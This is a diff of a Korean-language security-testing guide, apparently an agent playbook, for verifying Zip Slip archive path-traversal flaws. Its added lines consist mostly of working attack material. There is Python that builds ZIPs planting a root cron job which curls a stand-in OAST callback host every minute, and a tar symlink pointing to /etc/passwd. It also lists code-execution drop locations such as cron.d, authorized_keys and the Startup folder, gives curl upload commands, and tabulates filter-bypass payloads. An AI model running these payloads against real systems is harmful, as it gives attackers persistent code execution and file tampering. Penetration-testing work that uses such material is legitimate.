@@ -1,99 +1,121 @@
 ### Phase 2: 동적 테스트 (검증)
 
+**기본 페이로드:**
 
-**테스트용 Zip Slip 파일 생성:**
+**테스트 ZIP 생성 (Python):**
 ```python
-# 무해한 Zip Slip 테스트 파일 생성 (Python)
-import zipfile
-import io
-
-buf = io.BytesIO()
-with zipfile.ZipFile(buf, 'w') as zf:
-    # 웹 루트 방향으로 향하는 엔트리 (고유 파일명으로 기존 파일 충돌 방지)
-    import time
-    unique_name = f'zipslip-verify-{int(time.time())}.txt'
-    zf.writestr(f'../../public/{unique_name}', 'ZIPSLIP_TEST_MARKER')
-    # 정상 엔트리도 포함 (비교용)
-    zf.writestr('normal.txt', 'normal file')
-buf.seek(0)
-with open('zipslip-test.zip', 'wb') as f:
-    f.write(buf.read())
-```
-
-**검증 전략:**
-
-Zip Slip은 서버 내부에서 파일이 생성되므로 외부에서 결과를 확인하기 어렵다. 다음 방법들을 병행하고, **하나라도 파일 생성/실행이 확인되면 "확인됨"**으로 판정한다.
-
-**방법 1: 웹 접근 가능 경로로 검증 (가장 확실)**
-소스코드에서 압축 해제 대상 디렉토리와 웹 루트의 상대 경로를 파악한 뒤, 웹 루트(`public/`, `static/`, `uploads/`)로 향하는 경로를 가진 테스트 ZIP을 생성한다.
-
-```
-# 1. 테스트 ZIP 업로드
-curl -X POST "https://target.com/api/upload" \
-  -H "Cookie: session=..." \
-  -F "file=@zipslip-test.zip"
-
-# 2. 웹 루트에 파일이 생성되었는지 URL로 접근하여 확인
-# 파일명은 타임스탬프 기반 고유명을 사용하여 기존 파일과 충돌 방지
-curl "https://target.com/zipslip-verify-1753350000.txt"
-# 응답이 "ZIPSLIP_TEST_MARKER"이면 → Zip Slip 확인됨
-# 404이면 → 파일 미생성 (방어됨 또는 경로 불일치)
-```
-
-**방법 2: 서버 응답 기반 추론**
-파일이 웹 접근 불가 위치에 생성되는 경우, 서버 응답을 분석한다.
-
-```
-# 테스트 ZIP 업로드 후 응답 분석
-curl -X POST "https://target.com/api/upload" -F "file=@zipslip-test.zip" -v
-
-# 취약한 경우:
-# - 200 OK + "2 files extracted" (../가 포함된 엔트리도 정상 처리)
-# - 에러 없이 모든 엔트리 해제 완료
-
-# 안전한 경우:
-# - 400/500 에러 + "path traversal", "invalid path", "security" 등 에러 메시지
-# - "1 file extracted" (../가 포함된 엔트리는 건너뜀)
-# - 정상 엔트리만 해제되고 ../는 거부
-```
-
-**방법 3: OAST 콜백을 통한 검증**
-사용자에게 OAST(Out-of-band Application Security Testing) URL을 요청하여 (interactsh, Burp Collaborator 등), 파일 생성 시 외부 콜백이 발생하도록 한다. Linux 서버에서 `.bashrc`나 `.profile`에 파일이 생성되면 셸 로그인 시 자동으로 콜백이 실행된다.
-
-```python
-# OAST 콜백을 포함한 Zip Slip 테스트 파일 생성
 import zipfile, io, time
-
-oast_url = "OAST_URL_HERE"  # 사용자 제공 OAST URL
-unique_id = int(time.time())
-
+u = int(time.time())
 buf = io.BytesIO()
 with zipfile.ZipFile(buf, 'w') as zf:
-    # /tmp에 무해한 마커 파일 생성 (직접 확인용)
-    zf.writestr(f'../../tmp/zipslip-verify-{unique_id}.txt', 'ZIPSLIP_TEST_MARKER')
-    # OAST 콜백 파일 — 셸 실행 시 curl로 콜백 전송
-    zf.writestr(f'../../tmp/.zipslip-oast-{unique_id}.sh',
-        f'#!/bin/sh\ncurl -s "{oast_url}/zipslip-{unique_id}" >/dev/null 2>&1 &\n')
-buf.seek(0)
-with open('zipslip-oast-test.zip', 'wb') as f:
-    f.write(buf.read())
+    # 웹루트 traversal (가장 확실한 검증)
+    zf.writestr(f'../../public/zipslip-{u}.txt', 'ZIPSLIP_MARKER')
+    # 절대 경로
+    zf.writestr(f'/tmp/zipslip-abs-{u}.txt', 'ABS_MARKER')
+    # 정상 entry (비교용)
+    zf.writestr('normal.txt', 'normal')
+open('zipslip-test.zip', 'wb').write(buf.getvalue())
 ```
 
-OAST 서비스에서 콜백 수신이 확인되면 파일 생성 + 실행이 증명된다. 콜백이 오지 않아도 파일 자체는 생성되었을 수 있으므로 방법 1, 2와 병행한다.
+**Entry name 변형 (path 변형):**
+- `../../public/<unique>.txt` (Linux 웹루트)
+- `..\..\public\<unique>.txt` (Windows backslash)
+- `/etc/cron.d/<unique>` (Linux 절대경로)
+- `C:\Windows\Temp\<unique>.txt` (Windows 절대)
+- `....//....//etc/passwd` (이중 dot)
+- `..%2f..%2fetc%2fpasswd` (URL encoded — 일부 라이브러리 디코드)
+- `/var/www/html/<unique>.php` (PHP 실행 경로)
 
-**방법 4: 소스코드 분석 + 응답 종합 판단**
-서버 응답만으로는 확정이 어려운 경우, 소스코드에서 확인한 경로 검증 미흡 + 에러 없는 응답을 종합하여 판단한다. 이 경우 "후보"로 보고하되, 사용자에게 서버 파일 시스템 직접 확인을 안내한다.
+**RCE 게이트 entry (실행 트리거 위치):**
+- `/etc/cron.d/<unique>` — Linux cron (분당 실행)
+- `/etc/profile.d/<unique>.sh` — 셸 로그인 시
+- `~/.ssh/authorized_keys` — SSH 키 추가
+- `/var/spool/cron/root` — root crontab
+- `C:\Users\Public\Start Menu\Programs\Startup\<x>.bat` — Windows 시작
+- `/var/www/html/<unique>.php` — 웹 실행
+- `/usr/local/bin/<unique>` (PATH 첫번째 디렉토리)
 
-**최종 판정 기준:**
+**OAST 콜백 ZIP (Blind 검증):**
+```python
+import zipfile, io, time
+oast = "https://CALLBACK.oast.fun"
+u = int(time.time())
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w') as zf:
+    # cron.d (분당 실행 → 콜백)
+    zf.writestr(f'../../etc/cron.d/zipslip-{u}',
+        f'* * * * * root curl -s "{oast}/cron-{u}"\n')
+    # 마커 파일 (직접 검증)
+    zf.writestr(f'../../public/zipslip-{u}.txt', 'MARKER')
+open('zipslip-oast.zip', 'wb').write(buf.getvalue())
+```
 
-| 방법 1 (웹 접근) | 방법 2 (응답 분석) | 방법 3 (OAST) | 판정 |
-|---|---|---|---|
-| 파일 확인됨 | - | - | **확인됨** |
-| - | - | 콜백 수신됨 | **확인됨** |
-| 404 | 에러 없이 처리 | 콜백 없음 | **후보** (파일 생성 추정, 웹 접근 불가 위치) |
-| 404 | 에러 반환 | 콜백 없음 | **보고서 제외** (방어됨) |
-| - | 에러 없이 처리 | - | **후보** (방법 1 또는 3 병행 권장) |
+**Symlink ZIP (zipslip 대체):**
+```python
+import tarfile, io, time
+u = int(time.time())
+buf = io.BytesIO()
+with tarfile.open(fileobj=buf, mode='w') as tf:
+    info = tarfile.TarInfo(f'symlink-{u}')
+    info.type = tarfile.SYMTYPE
+    info.linkname = '/etc/passwd'
+    tf.addfile(info)
+open('symlink-test.tar', 'wb').write(buf.getvalue())
+```
 
-- **확인됨**: 방법 1에서 웹 접근으로 파일이 확인되거나, 방법 3에서 OAST 콜백이 수신됨
-- **후보**: 소스코드상 경로 검증이 없고 서버가 에러 없이 처리하지만, 파일 생성을 외부에서 직접 확인하지 못한 경우. 사용자에게 서버 파일 시스템 직접 확인 방법을 안내한다.
-- **보고서 제외**: 서버가 `../` 엔트리에 대해 에러를 반환하거나, 소스코드에서 경로 검증이 확인된 경우
+**검증 흐름:**
+```bash
+# 1. 업로드
+curl -X POST "https://target/api/upload" -H "Cookie: session=..." \
+  -F "file=@zipslip-test.zip" -v
+
+# 2. 웹 접근 검증 (가장 확실)
+curl "https://target/zipslip-<TIMESTAMP>.txt"
+# 응답이 "ZIPSLIP_MARKER"이면 확인됨
+
+# 3. OAST 콜백 모니터링
+# (cron이 실행되면 1분 내 callback 수신)
+```
+
+---
+
+**우회 페이로드:**
+
+| 방어 | 페이로드 (entry name) |
+|---|---|
+| `startsWith(base)` (separator 누락) | `/safe-evil/x` (prefix 통과) |
+| `..` 단일 차단 (`replace("..", "")`) | `....//`, `....\\\\`, `..%2f`, `..%5c`, `..\\..\\`, `....//....` |
+| URL 디코딩 후 `..` 검증 | Double encoding `%252e%252e%252f`, UTF-8 over-long `..%c0%af` |
+| 절대경로 차단 (`startsWith('/')`) | Windows `\path`, UNC `\\\\server\\share`, drive letter `C:\\path`, `\\?\C:\path` |
+| canonical path 검증 후 해제 | TOCTOU race — 검증 시점과 쓰기 시점 사이 symlink 생성 |
+| symlink entry skip | hard link (HRDLNK type), tar PAX header, GNU long name (`L`/`K` type) |
+| 압축 해제 전 검증 루프 | 검증 후 별도 라이브러리로 해제 — 두 구현 차이 |
+| Unicode 정규화 누락 | `．．／` (fullwidth period+slash), `..%c0%af` (overlong UTF-8) |
+| 확장자 검증 | `evil.jpg.sh` (이중 확장자), `evil.jpg/../../etc/x` |
+| ZIP entry name 길이 제한 | 짧은 traversal `../x`, 단일 `../` 반복 |
+
+**TOCTOU race:**
+```python
+# 1. 정상 entry로 검증 통과
+# 2. 동시에 다른 프로세스가 ZIP 파일 자체 교체 (race)
+# 일반적으로 추가 인프라 필요 — 응답 시간으로 추정
+```
+
+---
+
+**참고사항:**
+
+- 압축 해제 시점에 외부 검증이 어려움 — OAST + 웹루트 접근 병행 필수
+- 웹루트 (`public/`, `static/`, `uploads/`) 상대 경로를 소스에서 사전 파악
+- 실행 트리거 (cron, profile, .ssh/authorized_keys, /tmp/.so) 같은 위치는 즉시 RCE 게이트
+- OOXML/JAR/APK 파일도 내부 ZIP — 같은 검증 필요
+- adm-zip 0.5.10 미만, rubyzip 1.3.0 미만, Python 3.12 미만 (filter 미적용) 환경 별도 점검
+- `path.join`/`Path.combine`은 절대 경로 entry 받으면 base 무시 (Java `new File(base, entry)` 동일)
+- Windows + Linux 혼용 환경에서 `\\` 정규화 차이로 우회 가능
+- 압축 폭탄 (zip bomb)은 ZipSlip은 아니지만 같은 sink에서 DoS
+- HTTP 업로드 외 메일 첨부, S3 import, CI artifact 같은 경로도 동일 위험
+- Symlink entry는 tar 형식 — ZIP은 symlink 미지원 (단 일부 라이브러리는 임의 entry 허용)
+- 실제 RCE 게이트 (cron.d/profile.d) 사용 시 실제 코드 실행 → sandbox 한정
+- 마커 파일 (`ZIPSLIP_MARKER`)은 unique timestamp 사용해 collision/false positive 회피
+- canonical path 검증 후 해제도 TOCTOU race로 우회 가능 (드물지만 존재)
+- 일부 라이브러리는 ZIP central directory와 local header가 다른 path 가질 때 처리 차이 — 추가 검증면
